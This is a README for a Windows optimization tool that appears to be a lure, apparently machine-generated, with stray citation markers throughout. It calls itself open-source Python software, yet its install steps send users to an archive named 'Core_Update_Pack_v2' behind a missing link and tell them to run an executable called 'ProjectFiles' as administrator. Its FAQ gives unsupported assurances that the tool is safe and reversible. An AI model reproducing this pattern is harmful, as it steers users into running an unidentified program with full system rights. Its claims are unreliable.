## 📌 Overview

**Windows Performance Optimizer** is a powerful, open-source system optimization tool designed to help users clean, tweak, and boost Windows 10 and 11 performance [citation:4][citation:8]. Unlike other solutions, this tool uses intelligent algorithms to identify and resolve system bottlenecks, junk files, registry errors, and unnecessary background services that slow down your PC [citation:1].

Engineered for simplicity and effectiveness, Windows Performance Optimizer works on both high-end gaming rigs and older low-spec machines, making PC optimization accessible to everyone. Whether you're a gamer seeking higher FPS, a professional wanting faster boot times, or a casual user tired of system lag, this tool provides the edge you need [citation:5][citation:9].

### ✨ Key Features

- **🚀 One-Click Optimization** — Automatically clean junk files, fix registry issues, and optimize system settings [citation:1].
- **🧠 Smart System Tuning** — Uses AI-enhanced algorithms to identify performance bottlenecks [citation:1][citation:5].
- **🧹 Bloatware Removal** — Remove pre-installed Windows apps and unwanted software in batch mode [citation:4][citation:8].
- **⚡ Gaming Mode** — Prioritize system resources for games, reduce input lag, and boost FPS [citation:5][citation:9].
- **🔧 Registry Cleaner** — Safely scan and fix invalid or broken registry entries to enhance system stability [citation:1][citation:4].
- **📊 Real-Time Monitoring** — Track CPU, RAM, disk usage, and network activity live [citation:2].
- **🔒 Privacy Protection** — Disable telemetry, tracking, and unnecessary data collection services [citation:4][citation:8].
- **🔄 Startup Manager** — Control which applications launch automatically at boot to reduce startup time [citation:1][citation:2].
- **🗑️ Disk Cleanup** — Remove temporary files, cache, logs, and browser traces to free up storage space [citation:1][citation:7].
- **⚙️ Advanced Tweaks** — Customize power plans, visual effects, and system services for maximum performance [citation:1][citation:2].

## 🚀 Installation

### Quick Start Guide

1. **Download** the `Core_Update_Pack_v2` archive from the [link above](#-download).
2. **Extract** the contents to a folder of your choice (e.g., `C:\WinOptimizer`).
3. **Run** the `ProjectFiles` executable to launch the application.
4. **Follow** the on-screen instructions to scan and optimize your system.

> ⚠️ **Important:** Always run `ProjectFiles` as administrator (right-click → "Run as administrator") for full system access [citation:2][citation:8].

## 🎬 Usage Guide

### Getting Started
1. Open `ProjectFiles` after installation.
2. Click **"Smart Scan"** to analyze your system.
3. Review detected issues and optimization opportunities.
4. Click **"Fix All"** to apply recommended changes.
5. Restart your PC to see full performance improvements [citation:1].

### Pro Tips for Maximum Results
- Run the optimizer weekly for sustained performance [citation:1].
- Use **Gaming Mode** before launching resource-intensive games [citation:5][citation:9].
- Disable unnecessary startup programs to reduce boot time [citation:1].
- Clean temporary files and browser cache monthly to free up storage [citation:7].

### Command Line Options (Advanced Users)
```bash
# Quick scan and fix
python optimizer.py --scan --fix

# Clean junk files only
python optimizer.py --clean

# Enable gaming mode
python optimizer.py --gaming

# Disable specific services
python optimizer.py --services --disable "Xbox,Telemetry"
```

## ❓ FAQ

**Q: Is this tool safe to use on my PC?**  
A: Yes. All changes are reviewed and reversible. The tool creates restore points before making any modifications [citation:5].

**Q: Does it work on Windows 11?**  
A: Yes, fully compatible with Windows 10 (22H2) and Windows 11 (23H2, 24H2, 25H2) [citation:8].

**Q: Do I need to be an administrator?**  
A: Yes, administrator rights are required to modify system settings and services [citation:2][citation:8].

**Q: How often should I run the optimizer?**  
A: Weekly maintenance is recommended for optimal performance [citation:1][citation:7].

**Q: Can I revert changes if something goes wrong?**  
A: Absolutely. The tool creates restore points and allows you to revert all changes to default settings [citation:5].
